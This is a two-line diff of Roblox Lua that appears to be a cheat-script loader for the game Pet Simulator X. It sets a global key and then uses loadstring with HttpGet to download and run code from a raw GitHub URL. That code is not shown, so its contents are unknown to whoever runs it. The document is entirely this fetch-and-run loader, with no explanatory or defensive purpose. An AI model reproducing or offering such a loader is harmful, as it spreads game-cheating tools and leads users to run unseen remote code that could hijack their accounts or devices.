@@ -1,0 +1,2 @@
+_G.Key = "ttvpumpzghost123"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SilenceScripts/PetSimX/main/Mel"))()
